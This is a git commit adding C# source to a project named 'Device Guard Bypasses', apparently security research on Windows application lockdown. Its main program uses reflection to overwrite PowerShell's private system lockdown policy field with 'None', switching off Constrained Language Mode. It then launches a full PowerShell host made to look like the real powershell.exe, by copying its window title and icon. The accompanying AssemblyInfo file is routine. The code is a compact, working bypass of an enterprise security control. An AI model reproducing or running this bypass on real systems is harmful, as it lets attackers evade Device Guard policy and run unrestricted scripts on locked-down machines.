9aeb68aed943a422980db778589e4bc97b9d4505
James Forshaw <tyranid@gmail.com>
2017-08-02 18:50:51 +0100

    Added runpowershell code.

---
+++ RunPowershell/Program.cs
@@ -0,0 +1,91 @@
+﻿//  This file is part of Device Guard Bypasses
+//
+//  Device Guard Bypasses is free software: you can redistribute it 
+//  and/or modify it under the terms of the GNU General Public License
+//  as published by the Free Software Foundation, either version 3 of 
+//  the License, or (at your option) any later version.
+//
+//  Foobar is distributed in the hope that it will be useful,
+//  but WITHOUT ANY WARRANTY; without even the implied warranty of
+//  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.See the
+//  GNU General Public License for more details.
+//
+//  You should have received a copy of the GNU General Public License
+//  along with Device Guard Bypasses. If not, see<http://www.gnu.org/licenses/>.
+
+using Microsoft.PowerShell;
+using System;
+using System.Drawing;
+using System.IO;
+using System.Management.Automation.Security;
+using System.Reflection;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+
+namespace RunPowershell
+{
+    static class Program
+    {
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool AllocConsole();
+
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        static extern bool SetConsoleTitle(string lpConsoleTitle);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll", SetLastError = true)]
+        static extern IntPtr SendMessage(
+          IntPtr hWnd,
+          int    Msg,
+          int wParam,
+          IntPtr lParam
+        );
+
+        const int WM_SETICON = 0x0080;
+        const int ICON_BIG = 1;
+        const int ICON_SMALL = 0;
+
+        static void SetIcon()
+        {
+            try
+            {
+                IntPtr wnd = GetConsoleWindow();
+                Icon icon = Icon.ExtractAssociatedIcon(
+                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System),
+                        "WindowsPowerShell", "v1.0", "powershell.exe"));
+                SendMessage(wnd, WM_SETICON, ICON_BIG, icon.Handle);
+                SendMessage(wnd, WM_SETICON, ICON_SMALL, icon.Handle);
+            }
+            catch
+            {
+            }
+        }
+
+        /// <summary>
+        /// The main entry point for the application.
+        /// </summary>
+        [STAThread]
+        static void Main(string[] args)
+        {
+            try
+            {
+                var fi = typeof(SystemPolicy).GetField("systemLockdownPolicy", 
+                    BindingFlags.NonPublic | BindingFlags.Static);
+                fi.SetValue(null, SystemEnforcementMode.None);
+                
+                AllocConsole();
+                SetConsoleTitle("Windows Powershell");
+                SetIcon();
+                UnmanagedPSEntry ps = new UnmanagedPSEntry();
+                ps.Start(null, args);
+                Environment.Exit(0);
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+            }
+        }
+    }
+}
---
+++ RunPowershell/Properties/AssemblyInfo.cs
@@ -0,0 +1,35 @@
+﻿using System.Reflection;
+using System.Runtime.InteropServices;
+
+// General Information about an assembly is controlled through the following 
+// set of attributes. Change these attribute values to modify the information
+// associated with an assembly.
+[assembly: AssemblyTitle("RunPowershell")]
+[assembly: AssemblyDescription("Run PowerShell in entirely managed code.")]
+[assembly: AssemblyConfiguration("")]
+[assembly: AssemblyCompany("")]
+[assembly: AssemblyProduct("RunPowershell")]
+[assembly: AssemblyCopyright("Copyright © James Forshaw 2017")]
+[assembly: AssemblyTrademark("")]
+[assembly: AssemblyCulture("")]
+
+// Setting ComVisible to false makes the types in this assembly not visible 
+// to COM components.  If you need to access a type in this assembly from 
+// COM, set the ComVisible attribute to true on that type.
+[assembly: ComVisible(false)]
+
+// The following GUID is for the ID of the typelib if this project is exposed to COM
+[assembly: Guid("1e6e9b03-dd5f-4047-b386-af7a7904f884")]
+
+// Version information for an assembly consists of the following four values:
+//
+//      Major Version
+//      Minor Version 
+//      Build Number
+//      Revision
+//
+// You can specify all the values or you can default the Build and Revision Numbers 
+// by using the '*' as shown below:
+// [assembly: AssemblyVersion("1.0.*")]
+[assembly: AssemblyVersion("1.0.0.0")]
+[assembly: AssemblyFileVersion("1.0.0.0")]
